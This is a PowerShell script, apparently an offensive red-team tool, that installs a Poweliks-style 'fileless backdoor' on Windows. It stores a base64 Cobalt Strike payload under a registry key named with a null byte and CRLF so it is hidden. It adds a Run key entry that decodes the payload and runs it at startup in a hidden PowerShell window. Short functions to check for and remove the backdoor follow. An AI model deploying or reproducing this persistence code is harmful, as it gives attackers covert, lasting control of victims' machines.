function Persist-Poweliks{
<#
.SYNOPSIS
This script adds a "fileless backdoor" in a similar manner seen by the Poweliks malware. 
Author: Jonathan Echavarria (@Und3rf10w)

.DESCRIPTION
This function creates a registry key with the name of "<nullbyte><CRLF>", that contains an entry named "<nullbyte><CRLF>", that contains a passed base64ed powershell command (payload).
In addition, a run key entry is created named "<nullbyte><CRLF>" at "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
that executes the stored payload.

For more information, see: https://isc.sans.edu/forums/diary/20823

.EXAMPLE
PS C:\> Persist-Poweliks -cobaltstrike_gen_payload <provided by cobalt strike>
#>

    [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$True)]
        [string]$cobaltstrike_gen_payload
    )
    [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
    $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)

    $powershell_path = "$PSHome\powershell.exe"

    #Write the malformed registry key
    new-item -path "HKLM:SOFTWARE\$malformed_string" -force

    #Write the powershell bytecode to a key, $malformed_string, in HKLM:SOFTWARE\$malformed_string
    new-ItemProperty -path "HKLM:SOFTWARE\$malformed_string" -name "$malformed_string" -value "$cobaltstrike_gen_payload"

    # Double powershell method (will have 2 instances of powershell running)
    # New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "$powershell_path -windowstyle hidden -c `"`$val = (gp HKLM:SOFTWARE\`'$malformed_string`').`'$malformed_string`'; $powershell_path -windowstyle hidden -ec `$val`""
    
    # Single powershell method (will have one instance of powershell.exe running)
    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "$powershell_path -windowstyle hidden -c `"`$val = (gp HKLM:SOFTWARE\`'$malformed_string`').`'$malformed_string`'; `$d = [System.Text.Encoding]::Unicode.GetString([System.convert]::FromBase64String(`$val)); iex `$d`""
} 


function Test-Poweliks{
<#
.DESCRIPTION
This function checks for the presence of a backdoor that would have been added by the Persist-Poweliks function

.EXAMPLE
PS C:\> Test-Poweliks
#>

    [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
    $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)

    if (Test-Path "HKLM:\SOFTWARE\$malformed_string") {
        echo "[*] Backdoor exists"
    } else {
        echo "[!] No backdoor present"
    }
    if (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run "$malformed_string") {
        echo "[*] Launcher exists"
    } else {
        echo "[!] No launcher present"
    }
}

function Remove-Poweliks{
<#
.DESCRIPTION
This function removes a backdoor added by the Persist-Poweliks function

.EXAMPLE
PS C:\> Remove-Poweliks
#>
    [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
    $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)
    if (Test-Path "HKLM:\SOFTWARE\$malformed_string") {
        Remove-Item -Path "HKLM:\SOFTWARE\$malformed_string"
        echo "[*] Backdoor Removed"
    } else {
        echo "[!] Error Removing Backdoor (already removed?)"
    }

    if (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run "$malformed_string") {
        Remove-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "$malformed_string"
        echo "[*] Launcher Removed"
    } else {
        echo "[!] Error Remove Launcher (already removed?)"
    }
}
